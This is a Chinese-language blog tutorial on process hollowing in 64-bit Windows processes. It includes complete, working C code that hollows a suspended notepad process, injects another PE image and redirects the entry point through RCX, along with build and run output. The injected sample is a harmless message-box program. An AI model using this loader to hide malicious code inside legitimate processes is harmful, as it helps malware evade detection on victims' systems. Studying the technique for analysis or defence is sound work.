---
title: Process Hollowing在64位进程中的简单实现
date: 2021-01-28 17:05:20
tags: [Windows,进程注入,PE文件]
categories: Windows
toc: true
typora-root-url: windows-process-hollowing
---

首先，创建一个挂起状态的合法进程（比如notepad进程），然后再使用`ZwUnmapViewOfSection`或`NtUnmapViewOfSection`将合法的notepad模块占据的内存空间给unmap掉。接下来，向notepad的内存空间中写入恶意的PE文件，并通过修改进程的context，将入口点改为恶意PE文件的入口点。最后，使用`ResumeThread`使notepad恢复执行，从而达到在notepad进程空间中运行恶意PE文件的效果。这种方法就是Process Hollowing。

本文大量参考[Leitch, J. (n.d.). Process Hollowing.](http://www.autosectools.com/process-hollowing.pdf)这篇文章。

<!--more-->

## 获取一个符合要求的PE文件

Process Hollowing需要将一个PE文件手动加载到其他进程的内存空间中。因此，首先要获取一个PE文件。根据[Leitch, J. (n.d.). Process Hollowing.](http://www.autosectools.com/process-hollowing.pdf)这篇文章的说法，PE文件需要满足以下要求：

> To successfully perform process hollowing the source image must meet a few requirements: 
> 1. To maximize compatibility, the subsystem of the source image should be set to windows. 
> 2. The compiler should use the static version of the run-time library to remove dependence to the Visual C++ runtime DLL. This can be achieved by using the /MT or /MTd compiler options. 
> 3. Either the preferred base address (assuming it has one) of the source image must match that of the destination image, or the source must contain a relocation table and the image needs to be rebased to the address of the destination. For compatibility reasons the rebasing route is preferred. The /DYNAMICBASE or /FIXED:NO linker options can be used to generate a relocation table.

首先，为了增强PE文件的兼容性，subsystem需要设为windows。在实际操作中，我发现如果subsystem设置成了console，则PE文件无法注入Windows窗口程序（如notepad，calc），只能注入控制台程序（如cmd）。

另外，PE文件不应该依赖Visual C++ runtime DLL，这可以通过在编译时使用/MT或/MTd选项解决。

最后，如果PE文件无法加载到预定的基地址，还需进行重定位操作。不过本文只考虑PE文件可以加载到预定基地址的情况，因此不会进行重定位的操作。

根据上述三个要求，编写如下代码：

```c
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#pragma comment(lib, "user32.lib")

int WinMain() {
    srand(time(NULL));
    char str1[20];
    sprintf(str1, "Current pid: %d", GetCurrentProcessId());
    char str2[20];
    int i;
    while(i = rand() % 100) {
        sprintf(str2, "%d > 0", i);
        MessageBoxA(NULL, str1, str2, MB_ICONERROR | MB_OK);
    }
    return 0;
}
```

然后使用Visual Studio的命令行工具编译：

```
> vsdevcmd -arch=amd64
**********************************************************************
** Visual Studio 2019 Developer Command Prompt v16.8.4
** Copyright (c) 2020 Microsoft Corporation
**********************************************************************

> cl /MT source.c /link /subsystem:windows
用于 x64 的 Microsoft (R) C/C++ 优化编译器 19.28.29336 版
版权所有(C) Microsoft Corporation。保留所有权利。

source.c
source.c(7): warning C4026: 使用形参表声明的函数
Microsoft (R) Incremental Linker Version 14.28.29336.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:source.exe
/subsystem:windows
source.obj
```

## 根据PE文件内容将其加载到内存

假设已经将PE文件全部读入内存，并且保存到了一个`buf`数组当中，现在要获取其装入内存后的情况，并且保存在另一个数组`mem`中。

首先，找到e_lfanew，并据此定位到其NT映像头：

```c
    //读取DOS文件头，获取e_lfanew
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)&buf[0];
    //获取映像头
    PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)&buf[dosHeader->e_lfanew];
```

NT映像头中包含一些信息，比如可执行文件默认装入的地址ImageBase，装入内存后映像的总尺寸SizeOfImage，程序入口点AddressOfEntryPoint等。根据SizeOfImage就可以知道需要多大的内存来保存PE文件装入内存的状态，而ImageBase和AddressOfEntryPoint则在后面的操作需要用到：

```c
    //根据可选头的SizeOfImage分配内存
    unsigned char *mem = calloc(ntHeader->OptionalHeader.SizeOfImage, 1);
    (*pImageBase) = ntHeader->OptionalHeader.ImageBase;
    (*pEntryPoint) = ntHeader->OptionalHeader.AddressOfEntryPoint;
    (*pSizeOfImage) = ntHeader->OptionalHeader.SizeOfImage;
```

NT映像头中还包含一个SizeOfHeaders，根据这一数据将PE文件的头部复制到内存中：

```c
    //将文件头复制到内存中
    memcpy(mem, buf, ntHeader->OptionalHeader.SizeOfHeaders);
```

最后，根据节表包含的信息将每一节依次装载到内存中的特定位置：

```c
    //获取节表起始位置
    PIMAGE_SECTION_HEADER sectionHeader = 
        (PIMAGE_SECTION_HEADER)&buf[dosHeader->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + ntHeader->FileHeader.SizeOfOptionalHeader];

    //将每一节的内容依次复制到内存中
    for(int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        DWORD rva = sectionHeader[i].VirtualAddress;
        DWORD fptr = sectionHeader[i].PointerToRawData;
        memcpy(&mem[rva], &buf[fptr], sectionHeader[i].SizeOfRawData);
    }
```

将上述过程写成`load_pe64`函数，其完整内容如下：

```c
unsigned char *load_pe64(unsigned char *buf, int *pSizeOfImage, ULONGLONG *pImageBase, DWORD *pEntryPoint) {
    //读取DOS文件头，获取e_lfanew
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)&buf[0];
    //获取映像头
    PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)&buf[dosHeader->e_lfanew];
    //根据可选头的SizeOfImage分配内存
    unsigned char *mem = calloc(ntHeader->OptionalHeader.SizeOfImage, 1);
    (*pImageBase) = ntHeader->OptionalHeader.ImageBase;
    (*pEntryPoint) = ntHeader->OptionalHeader.AddressOfEntryPoint;
    (*pSizeOfImage) = ntHeader->OptionalHeader.SizeOfImage;
    //获取节表起始位置
    PIMAGE_SECTION_HEADER sectionHeader = 
        (PIMAGE_SECTION_HEADER)&buf[dosHeader->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + ntHeader->FileHeader.SizeOfOptionalHeader];
    //将文件头复制到内存中
    memcpy(mem, buf, ntHeader->OptionalHeader.SizeOfHeaders);
    //将每一节的内容依次复制到内存中
    for(int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        DWORD rva = sectionHeader[i].VirtualAddress;
        DWORD fptr = sectionHeader[i].PointerToRawData;
        memcpy(&mem[rva], &buf[fptr], sectionHeader[i].SizeOfRawData);
    }
    return mem;
}
```

## 编写程序实现Process Hollowing

### 创建挂起的notepad进程

创建挂起状态的子进程只需要在CreateProcessA的时候加一句CREATE_SUSPENDED就行了。

```c
    //创建挂起的notepad进程
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    BOOL result = CreateProcessA( NULL,        //lpApplicationName
                    "notepad",  //lpCommandLine
                    NULL,
                    NULL,
                    FALSE,
                    CREATE_SUSPENDED,
                    NULL,
                    NULL,
                    &si,    //lpStartupInfo
                    &pi);   //lpProcessInformation
    if(!result) {
        printf("CreateProcess Failed: %d\n", GetLastError());
        return -1;
    }
    printf("Create Suspended notepad, pid: %d\n", pi.dwProcessId);
```

### 获取notepad加载的基地址

进程真实加载的地址需要从PEB中找到，所以先要找到PEB的基地址。一种方法是通过NtQueryInformationProcess找到PEB基地址。

```c
    //获取notepad进程的PEB地址
    PROCESS_BASIC_INFORMATION processInfo;
    NtQueryInformationProcess(pi.hProcess, 0, &processInfo, sizeof(processInfo), NULL);
    printf("PebBaseAddress: %p\n", processInfo.PebBaseAddress);
```

如果查看微软关于PEB的官方文档，会发现PEB中很多项都是Reserved。要想知道PEB中每一项真实的含义是什么，可以在别的网站上看：

[PEB (Process Enviroment Block)](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FProcess%2FPEB.html)

然后就可以发现，官方文档中的`Reserved3[1]`这一项实际上就是ImageBaseAddress，据此就可以找到notepad模块的基地址：

```c
    //PEB的Reserved3[1]就是notepad进程加载的基地址
    PEB processPeb;
    result = ReadProcessMemory(pi.hProcess, processInfo.PebBaseAddress, &processPeb, sizeof(processPeb), NULL);
    void *originImageBase = processPeb.Reserved3[1];
    printf("ImageBaseAddress: %p\n", originImageBase);
    system("pause");
```

知道了notepad的基地址后，就可以通过NtUnmapViewOfSection将notepad占据的内存给unmap掉了：

```c
    //unmap合法内存的代码
    DWORD dwResult = NtUnmapViewOfSection(pi.hProcess, originImageBase);
    if(dwResult) {
        printf("NtUnmapViewOfSection Failed: %d\n", dwResult);
        return -1;
    }
```

### 将PE文件加载到notepad内存空间中

将想要加载的PE文件读入内存：

```c
    //读取source.exe文件，将PE文件内容全部放入内存
    FILE *fptr = fopen("source.exe", "rb");
    if(NULL == fptr) {
        printf("Open source.exe Failed!\n");
        return -1;
    }
    fseek(fptr, 0L, SEEK_END);
    long fileSize = ftell(fptr);
    rewind(fptr);
    BYTE *fileBuf = (BYTE *)malloc(fileSize + 0x10000);
    if(NULL == fileBuf) {
        printf("Malloc Failed!\n");
        return -1;
    }
    fread(fileBuf, 1, fileSize, fptr);
    fclose(fptr);
```

然后，调用之前写的`load_pe64`函数，将PE文件按照文件结构载入内存中：

```c
    //根据PE文件内容生成PE文件载入内存的状态
    int ImageSize;
    ULONGLONG newImageBase;
    DWORD entryPoint;
    unsigned char *peMem = load_pe64(fileBuf, &ImageSize, &newImageBase, &entryPoint);
    printf("SizeOfImage: 0x%x, ImageBase: 0x%llx, AddressOfEntryPoint: 0x%x\n", 
            ImageSize, newImageBase, entryPoint);
```

最后，使用WriteProcessMemory，将这块内存写到notepad的内存空间中：

```c
    //VirtualAllocEx申请一块内存加载source.exe
    void *mem = VirtualAllocEx(pi.hProcess, (void *)newImageBase, ImageSize, 
                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(mem != (void *)newImageBase) {
        printf("VirtualAllocEx Failed, mem: %p", mem);
        free(peMem);
        free(fileBuf);
        return -1;
    }
    //将source.exe写入notepad进程空间中
    result = WriteProcessMemory(pi.hProcess, mem, peMem, ImageSize, NULL);
    free(peMem);
    free(fileBuf);
    if(!result) {
        printf("Load PE Failed: %d\n", GetLastError());
        return -1;
    }
```

由于没有进行重定位操作，这里申请的内存起始地址必须为可执行文件默认装入的内存地址，即PE文件中的ImageBase。

PEB中的ImageBaseAddress这一项也得进行相应的修改：

```c
    //修改PEB中的ImageBase
    processPeb.Reserved3[1] = (PVOID)newImageBase;
    result = WriteProcessMemory(pi.hProcess, processInfo.PebBaseAddress, &processPeb, sizeof(processPeb), NULL);
    if(!result) {
        printf("Modify PEB Failed: %d\n", GetLastError());
        return -1;
    }
```

### 修改进程的context

CONTEXT结构体中存储了一些寄存器的值，可以通过设置notepad进程的context设置它的寄存器的值。

当进程以挂起状态被创建时，它的入口点被存储在了寄存器当中。在32位进程中，存储入口点的寄存器为EAX，所以[Leitch, J. (n.d.). Process Hollowing.](http://www.autosectools.com/process-hollowing.pdf)这篇文章会设置CONTEXT结构体中的Eax这一项。

在64位进程中，存储入口点的寄存器变成了RCX。可以在创建了挂起的notepad进程后，使用x64dbg附加到这个进程上，看一下各个寄存器的值：

![notepad进程中寄存器的值](image-20210128194208590.png)

其中RCX的值就是<notepad.EntryPoint>。

由于PE文件已经加载到了notepad内存空间中，EntryPoint也发生了相应的变化，故需要对RCX寄存器的值进行修改：

```c
    //修改notepad进程的context，将入口点(rcx寄存器)设置为source.exe的入口点
    CONTEXT targetContext;
    targetContext.ContextFlags = CONTEXT_FULL;
    result = GetThreadContext(pi.hThread, &targetContext);
    if(!result) {
        printf("GetThreadContext Failed: %d\n", GetLastError());
        return -1;
    }
    targetContext.Rcx = newImageBase + entryPoint;
    result = SetThreadContext(pi.hThread, &targetContext);
    if(!result) {
        printf("SetThreadContext Failed: %d\n", GetLastError());
        return -1;
    }
```

### 让挂起的notepad恢复运行

最后，使用ResumeThread恢复notepad的运行：

```c
    ResumeThread(pi.hThread);
    printf("Injected!\n");
    WaitForSingleObject(pi.hThread, INFINITE);
    printf("Wait Complete!\n");
```

然后就能发现，运行的并不是notepad程序，而是一个弹窗程序，这就说明成功进行了进程的替换。

### 完整代码

```c
#include <windows.h>
#include <winternl.h>
#include <stdlib.h>
#include <stdio.h>
#pragma comment(lib, "ntdll.lib")

unsigned char *load_pe64(unsigned char *buf, int *pSizeOfImage, ULONGLONG *pImageBase, DWORD *pEntryPoint) {
    //读取DOS文件头，获取e_lfanew
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)&buf[0];
    //获取映像头
    PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)&buf[dosHeader->e_lfanew];
    //根据可选头的SizeOfImage分配内存
    unsigned char *mem = calloc(ntHeader->OptionalHeader.SizeOfImage, 1);
    (*pImageBase) = ntHeader->OptionalHeader.ImageBase;
    (*pEntryPoint) = ntHeader->OptionalHeader.AddressOfEntryPoint;
    (*pSizeOfImage) = ntHeader->OptionalHeader.SizeOfImage;
    //获取节表起始位置
    PIMAGE_SECTION_HEADER sectionHeader = 
        (PIMAGE_SECTION_HEADER)&buf[dosHeader->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + ntHeader->FileHeader.SizeOfOptionalHeader];
    //将文件头复制到内存中
    memcpy(mem, buf, ntHeader->OptionalHeader.SizeOfHeaders);
    //将每一节的内容依次复制到内存中
    for(int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        DWORD rva = sectionHeader[i].VirtualAddress;
        DWORD fptr = sectionHeader[i].PointerToRawData;
        memcpy(&mem[rva], &buf[fptr], sectionHeader[i].SizeOfRawData);
    }
    return mem;
}

int main() {
    //创建挂起的notepad进程
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    BOOL result = CreateProcessA( NULL,        //lpApplicationName
                    "notepad",  //lpCommandLine
                    NULL,
                    NULL,
                    FALSE,
                    CREATE_SUSPENDED,
                    NULL,
                    NULL,
                    &si,    //lpStartupInfo
                    &pi);   //lpProcessInformation
    if(!result) {
        printf("CreateProcess Failed: %d\n", GetLastError());
        return -1;
    }
    printf("Create Suspended notepad, pid: %d\n", pi.dwProcessId);
    //获取notepad进程的PEB地址
    PROCESS_BASIC_INFORMATION processInfo;
    NtQueryInformationProcess(pi.hProcess, 0, &processInfo, sizeof(processInfo), NULL);
    printf("PebBaseAddress: %p\n", processInfo.PebBaseAddress);
    //PEB的Reserved3[1]就是notepad进程加载的基地址
    PEB processPeb;
    result = ReadProcessMemory(pi.hProcess, processInfo.PebBaseAddress, &processPeb, sizeof(processPeb), NULL);
    void *originImageBase = processPeb.Reserved3[1];
    printf("ImageBaseAddress: %p\n", originImageBase);
    system("pause");
    //unmap合法内存的代码
    DWORD dwResult = NtUnmapViewOfSection(pi.hProcess, originImageBase);
    if(dwResult) {
        printf("NtUnmapViewOfSection Failed: %d\n", dwResult);
        return -1;
    }
    //读取source.exe文件，将PE文件内容全部放入内存
    FILE *fptr = fopen("source.exe", "rb");
    if(NULL == fptr) {
        printf("Open source.exe Failed!\n");
        return -1;
    }
    fseek(fptr, 0L, SEEK_END);
    long fileSize = ftell(fptr);
    rewind(fptr);
    BYTE *fileBuf = (BYTE *)malloc(fileSize + 0x10000);
    if(NULL == fileBuf) {
        printf("Malloc Failed!\n");
        return -1;
    }
    fread(fileBuf, 1, fileSize, fptr);
    fclose(fptr);
    //根据PE文件内容生成PE文件载入内存的状态
    int ImageSize;
    ULONGLONG newImageBase;
    DWORD entryPoint;
    unsigned char *peMem = load_pe64(fileBuf, &ImageSize, &newImageBase, &entryPoint);
    printf("SizeOfImage: 0x%x, ImageBase: 0x%llx, AddressOfEntryPoint: 0x%x\n", 
            ImageSize, newImageBase, entryPoint);
    //VirtualAllocEx申请一块内存加载source.exe
    void *mem = VirtualAllocEx(pi.hProcess, (void *)newImageBase, ImageSize, 
                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(mem != (void *)newImageBase) {
        printf("VirtualAllocEx Failed, mem: %p", mem);
        free(peMem);
        free(fileBuf);
        return -1;
    }
    //将source.exe写入notepad进程空间中
    result = WriteProcessMemory(pi.hProcess, mem, peMem, ImageSize, NULL);
    free(peMem);
    free(fileBuf);
    if(!result) {
        printf("Load PE Failed: %d\n", GetLastError());
        return -1;
    }
    //修改PEB中的ImageBase
    processPeb.Reserved3[1] = (PVOID)newImageBase;
    result = WriteProcessMemory(pi.hProcess, processInfo.PebBaseAddress, &processPeb, sizeof(processPeb), NULL);
    if(!result) {
        printf("Modify PEB Failed: %d\n", GetLastError());
        return -1;
    }
    //修改notepad进程的context，将入口点(rcx寄存器)设置为source.exe的入口点
    CONTEXT targetContext;
    targetContext.ContextFlags = CONTEXT_FULL;
    result = GetThreadContext(pi.hThread, &targetContext);
    if(!result) {
        printf("GetThreadContext Failed: %d\n", GetLastError());
        return -1;
    }
    targetContext.Rcx = newImageBase + entryPoint;
    result = SetThreadContext(pi.hThread, &targetContext);
    if(!result) {
        printf("SetThreadContext Failed: %d\n", GetLastError());
        return -1;
    }
    system("pause");
    ResumeThread(pi.hThread);
    printf("Injected!\n");
    WaitForSingleObject(pi.hThread, INFINITE);
    printf("Wait Complete!\n");
    return 0;
}
```

编译运行：

```
> cl hollow.c
用于 x64 的 Microsoft (R) C/C++ 优化编译器 19.28.29336 版
版权所有(C) Microsoft Corporation。保留所有权利。

hollow.c
hollow.c(1): warning C4819: 该文件包含不能在当前代码页(936)中表示的字符。请将该文件保存为 Unicode 格式以防止数据丢失
Microsoft (R) Incremental Linker Version 14.28.29336.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:hollow.exe
hollow.obj

> hollow
Create Suspended notepad, pid: 10776
PebBaseAddress: 000000FD3FB49000
ImageBaseAddress: 00007FF6CA930000
Press any key to continue . . .
SizeOfImage: 0x20000, ImageBase: 0x140000000, AddressOfEntryPoint: 0x14fc
Press any key to continue . . .
Injected!
Wait Complete!

```

